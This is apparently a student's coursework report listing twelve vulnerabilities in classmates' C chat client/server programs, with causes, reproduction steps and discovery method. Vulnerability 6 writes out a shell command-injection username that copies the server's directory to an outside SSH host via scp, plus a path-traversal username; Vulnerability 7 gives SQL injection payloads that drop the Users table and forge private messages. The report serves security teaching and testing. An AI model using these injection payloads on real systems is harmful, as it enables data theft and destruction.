---
title: Assignment 2 - Vulnerabilities - Martynas Rimkevicius
---

<!-- markdownlint-disable MD010 MD041 MD001 MD036-->

## Vulnerability 1 (program 1)

Type: authentication error

Impact: Loss of availability - users cannot see that the user, who is still online, is online

Cause: No check for multiple instances of the same user logging in to different clients simultaniously (worker.c `void handle_logout` line 259). This would be correct if user was still shown as logged in, when one client logs out but the other is still on.

**Steps:** \
Client 1: `/register gahsd adsad` (user gets registered) \
Client 2: `/login gahsd adsad` (while terminal 1 is still running, response is _authentication succeeded_) \
Client 3: `/register aha test` (while terminal 1 and 2 are still running) \
Client 3: `@gahsd test message` - message is delivered to both running user _gahsd_ clients. \
Client 2: quits \
Client 3: `/users` command shows only _aha_; `@gahsd test 2` command shows _error: invalid credentials_ \
To test if the Client 1 works general message from _gahsd_ gets delivered to the Client 3, but in `/users` command it does not show **all** the users that are online.

**Found:** Trying the functional security requirements of the program - manual testing. In particular trying registering and logging in with the same username on multiple clients. It was discovered when one client was quit from and then the other two clients were used to continue test if the user was still connected. Which was not the case, proven by opening the database to check whether the value representing the "logged in" condition was not set to true for user _gahsd_.

## Vulnerability 2 (program 2)

Type: cryptography used incorrectly

Impact: Data leak

Cause: Mallory can brute force other user's password and leak their private messages. Because it is not using salt to generate a password and using just hashing (SHA224) in client.c client_process_command() lines 119-139.

Steps: This vulnerability was found through the code, but it can be exploited with simple brute force password guesser. If user is known to be registered, the password can be put in over and over, and thus be guessed over time.

Found: In the database Users table there is no field for salt for the hash, thus this raised a suspicion that salt might not be used and once the hashing part of the code was located, it could be seen that it is not used.

## Vulnerability 3 (program 2)

Type: Incorrect error handling

Impact: Data leak

Cause: Users can see partial password of a new user if their created password is longer than (213 - length of username - 9 ("/register") - 2 (for spaces)). Setting a strict boundary for read, but not checking if there is something left over, thus the rest of the information ending up in a general message after registration (since by then user that is being registered is already logged in). client.c client_process_command() lines 69-71 - here it reads 213 characters from the stdin, but it never flushes the input, therefore with the next read it ends up being a general message.

Steps: using /register command, have a short username (the maximum is set as 30 for it), and have a long password (for example, generate 256 character length string). After putting this string in, one can see the part of that string being sent as a public message:

```bash
/register abs rSAxVCA9DCdQcCnAK9TZGUA4gb4om4RfB5WDnswv7eMWbgl4qfNUQEb79FP063A9lswwenqx8APAuhi5bSWjpM6CqvJpWXGRxJAtLcFZgrgUsOyWfH9PjFAffAUEyXNsmdD5vSTguuDHEiu2riuLS7Ug91d5Siks50QYcHYOThp9d0cJ2k50clYR2gieB9Q0BTWAVhmF2orPkorRdsYxiuVsEI3gpd4rqVOg4defCTyt4MEpirjIloF9nCS9glDY
registration succeeded
2022-12-13 10:46:01 abs: F2orPkorRdsYxiuVsEI3gpd4rqVOg4defCTyt4MEpirjIloF9nCS9glDY
```

Found: manual code inspection - in the code I noticed limit on the read buffer from stdin, therefore I wanted to try a long password input to see how it is handled. Therefore I generated 256 character string and saw that it was not handled correctly.

## Vulnerability 4 (program 6)

Type: other - new users are not able to register

Impact: Loss of availability

Cause: user is unable to relogin or register after there are a lot of messages sent in the server. When a new user registers or a user relogs in, they retrieve only part of the messages from the database, but the count of messages is correctly calculated, therefore there is a read out of bounds and the server worker that is in the connection with this user SEGFAULTS. This can be seen in worker.c get_new_msgs() lines 32-41. Specifically this `for (int i = 0; i < msg_read + priv_msg_count; i++)` traverses db_msgs array out of bounds because there is no check for msg_read + priv_msg_count and maximum amound of messages from the database: msg_read.

Steps: The conversation of 3 clients was as follows:

```bash
2022-12-13 12:19:41 test2: test
2022-12-13 12:19:45 this1: test
2022-12-13 12:21:10 this1: lets send a lot of messages
2022-12-13 12:21:22 test2: this is a lot of messages
2022-12-13 12:21:28 test2: this is again
2022-12-13 12:21:31 test2: again
2022-12-13 12:21:33 test2: and again
2022-12-13 12:21:39 this1: a lot of messages
2022-12-13 12:21:45 test3: sent from you
2022-12-13 12:21:46 test3: to me
```

After this, user _test3_ logged out and tried to relogin, but after having received feedback from the server "authentication succeeded", the client exited. User _test2_ used `/users` command and got following output:

```bash
/users
this1
test2
test3
```

This means that user is logged in, but the client does not work. New user _test4_ tried to register, received the message "registration succeeded", and the client crashed.

Found: It was found during stress testing - sending random messages with initially 2 users and then adding the 3rd one.

## Vulnerability 5 (program 5)

Type: cryptography missing where required - missing message signatures

Impact: data corruption

Cause: each message sent from the client is missing the signature of that user, therefore the message can be modified and neither receiver, nor server would know that this edit occured. Since it is missing signatures, there is no particular location to be found in the code. The implementation of the signatures should be both in client send and receive functions to validate the messages and the server side send and receive, thus in the api_send, api_recv functions.

Steps: The vulnerability was found in the code, and would be abused, according to the threat model, in the hijacked connection, which I was not able to do.

Found: manual code inspection - it was found while looking through the client sending a message function, where the goal was to find how the message is safeguarded from being read while on the network.

## Vulnerability 6 (program 2)

Type: command injection

Impact: Data leak - , and data corruption -

Cause: server unknowingly can send its data to Mallory and server can be corrupted through command injection. This is because of not sanitizing username on the server side. There is an assumption, that the username is only alphanumeric characters, when it is sent to the server, because it does this check in the client side (client.c client_process_command() lines 105-111), but if the client is malicious, i.e. these lines are removed, the server generates client keys with their username (worker.c execute_request() line 282, rsa.c generate_keys() line 85 and 89 `sprintf(command, "openssl genrsa -out clientkeys/%s-private-key.pem 2048 > /dev/null 2>&1", username);`)

Steps: Create a malicious client by removing lines 105-111 in client.c file, which check if the username has non-alphanumeric characters. \
To inject a command, username cannot have spaces in its name, therefore spaces need to be replaced with `${IFS}` characters. Example of data leak can be copying current directory into a Mallory controlled ssh server, which does not need authentification. (Example registration (but this one needs authentification): `/register scp${IFS}-r${IFS}.${IFS}mrs368@ssh.data.vu.nl: test`).
Also, this vulnerability allows to write the RSA key pair into any directory on the server, example of this `/register ../../.. password` \
If the command or the given path are too long such that the client says "error: invalid command format", it is possible to disable this check in the client by removing lines 101-104 in the client.c file. Since this check is only in the client, the malicious client can inject even more elaborate command in the server.

Found: manual code inspection - it was found when I noticed that there is a shell system call with the string formatter in the rsa.c, which uses the username. After trying to use `../` blocks to traverse the path back to unexpected directories, I was not able to do so because of the check for alphanumeric characters. However, this check is on the client side only, thus, after having modified the client to be malicious, I was able to traverse directories on the server side.

## Vulnerability 7 (program 2)

Type: SQL injection

Impact: Loss of availability and data corruption

Cause: It is possible to manipulate the tables, such that the server crashes because of SQL error and Mallory can impersonate a user by injecting values into the database that represent a private message sent by someone else. This is because sanitizing user input for SQL code only in the **client** (client.c client_process_command() lines 148-153). If this sanitization is disabled, the SQL injection can take place.

```C
for (int i = 0; i < strlen(message); i++) {
    if (message[i] == '\'') {
        memmove(message + i + 1, message + i, strlen(message) - i + 1);
        message[i++] = '\'';
    }
}
```

Steps: create a malicious client by removing lines 148-153 in client.c file \
messages sent to have users: \
`/register abd asd` \
`/register user 123` \
message sent to have loss of availability: \
`ap',0,'abd','NULL'); drop table Users;` \
message sent to have data corruption: \
`ap',0,'abd','NULL'); INSERT INTO Messages VALUES(7, 'fake text', 1, 'user', 'abd');`

Found: manual code inspection - reading the client code I noticed that there is sanitization there, but not on the server side. This meant that there can be SQL injection, thus tried inputs, where the messages were inserted. Since after each SQL injection server crashes, I restarted it, relogged in and found the inserted messages. Also this was checked with sqlite itself - opening chat.db file and confirming that the messages were inserted.

## Vulnerability 8 (program 4)

Type: cryptography missing where required

Impact: Data leak

Cause: according to the threat model Mallory could read the data sent over the network connection, therefore read the private messages that are not intended to be seen by them. Lack of RSA encryption of client-server communication, when sending the messages. In lines 66-154 client_process_command function, client.c. Messages are parsed, and formed to be sent to the server, but not encrypted.

Steps: The vulnerability was found in the code, and would be read, according to the threat model, in the hijacked connection, which I was not able to do.

Found: It was found while looking through the client sending a message function, where the goal was to find how the message is modified before it is written to the socket.

## Vulnerability 9 (program 6)

Type: Malloc error

Impact: Loss of availability (crash)

Cause: in api.c api_recv_packet() function, in line 377 `api_packet_t *packet = malloc(hdr_size + payload_size);`, the payload_size is incorrectly calculated, such that malloc does not see it as a correct size. This function is called by both server worker and client, therefore with the given input can crash on both client and the worker, thus disabling the availability.

Steps: after registering a user, send a message "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Praesent ut justo scelerisque, semper nunc in, semper augue. Nullam in egestas libero, sit amet ultrices arcu. Morbi euismod vel urna sed consequat. Nulla ex leo, semper id erat vel vestibulu" (248 bytes). \
Output either in the server or the client: `malloc(): invalid next size (unsorted)`

Found: manual testing with the mentioned input.

## Vulnerability 10 (program 5)

Type: Incorrect error handling

Impact: Loss of availability (broken connection)

Cause: after this error not being handled client can think it is still connected, but it is not anymore. Because of a long message sent from the client to the worker, that is being encrypted with RSA, the message length, that was supposed to be in the message packet itself was not there, and in api.c api_recv(), line 104, there is a SEGFAULT, where the string cannot be converted to int.

Steps: after registering a user send this message: \
"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Praesent ut justo scelerisque, semper nunc in, semper augue. Nullam in egestas libero, sit amet ultrices arcu. Morbi euismod vel urna sed consequat. Nulla ex leo, semper id erat vel vestibulu" (248 bytes)

Found: manual testing with the mentioned input.

## Vulnerability 11 (program 1)

Type: Use-after-free (Double free)

Impact: Loss of availability (connection crash)

Cause: after this error client is not connected to the server anymore, since the worker crashes. Realloc in api.c api_recv() function at line 58 `realloc(msg, total_size);`, reallocates the msg with the total size, but in the assigns a new pointer to msg, thus overwriting the pointer obtained previously, and thus the free() crashes on the pointer later on, since it passes a pointer to free() obtained previously.

Steps: \
After /register command send this message: \
"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin cursus leo vel consectetur ultricies. Proin nec augue quis enim cursus molestie. Etiam varius dolor ut quam ornare sodales. Nunc eu imperdiet tortor. Maecenas non elit quis mauris aliquam vulputate id ac augue. Suspendisse consequat in ante nec porta. Nunc lectus velit, facilisis non libero id, volutpat accumsan sapien. Duis a sodales risus. Duis turpis ante, iaculis a eros sit amet, facilisis interdum tortor. Praesent sagittis tellus vitae ornare cursus. Nulla sed pulvinar libero. Etiam pulvinar accumsan velit a viverra. Maecenas aliquam." (the shortest message to reach this vulnerability is 608 bytes)

Found: manual testing with the mentioned input to see what happens with long inputs.

## Vulnerability 12 (program 5)

Type: cryptography is not used correctly

Impact: data leak - according to the threat model Mallory could hijack the network connection, and having the RSA key-pair could read the data.

Cause: each message sent from the client is encrypted only with the server public key sent both ways (client-server and server-client), and since the message is encrypted/decrypted with the same key-pair on both sides, mallory, having hijacked one client, could know the key-pair and use it to intercept connections on the network, decrypt them, **read and modify** them and and send them, and it could not be known to any party. This can be seen in api.c api_recv() line 96 `private_decrypt(buffer, read, "serverkeys/server-key.pem", decrypted);` and api_send() line 174 `public_encrypt(serialized, strlen((char *)serialized), "serverkeys/public-key.pem", encrypted);`. Both functions are used in the client.c and worker.c to send and receive the messages.

Steps: The vulnerability was found in the code, and would be abused, according to the threat model, in the hijacked connection, which I was not able to do.

Found: It was found while looking through the client sending a message function, where the goal was to find how the message is safeguarded from being read while on the network.
